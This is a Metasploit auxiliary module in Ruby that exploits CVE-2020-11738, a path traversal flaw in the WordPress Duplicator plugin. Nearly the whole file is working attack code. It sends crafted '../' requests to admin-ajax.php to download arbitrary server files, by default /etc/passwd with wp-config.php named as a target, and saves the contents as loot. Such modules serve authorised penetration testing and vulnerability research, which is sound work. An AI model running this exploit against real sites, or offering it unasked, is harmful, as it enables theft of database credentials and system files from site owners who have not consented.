##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Duplicator File Download Vulnerability',
      'Description'    => %q{
        The issue is being actively exploited, and allows attackers to download arbitrary files, such as the wp-config.php file.
        According to the vendor, the vulnerability was only in two versions v1.3.24 and v1.3.26, the vulnerability wasn't present in versions 1.3.22 and before.
      },
      'References'     =>
        [
          ['CVE', '2020-11738'],
          ['WPVDB', '10078']
        ],
      'Author'         =>
        [
          'Ramuel Gall', # Vulnerability discovery
          'Hoa Nguyen - SunCSR Team' # Metasploit module
        ],
        'DisclosureDate' => "Feb 19 2020",
      'License'        => MSF_LICENSE

    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])
      ])
  end

  def check
    check_plugin_version_from_readme('duplicator_download','1.3.27','1.3.24')
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path,'wp-admin', 'admin-ajax.php'),
      'vars_get' =>
        {
          'action' => "duplicator_download",
          'file' => "#{traversal}#{filename}"
        }
    })

    if res && res.code == 200 && res.body.length > 0

      print_status('Downloading file...')
      print_line("\n#{res.body}\n")

      fname = datastore['FILEPATH']

      path = store_loot(
        'duplicator.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("File saved in: #{path}")
    else
      print_error("Nothing was downloaded. You can try to change the DEPTH parameter.")
    end
  end
end

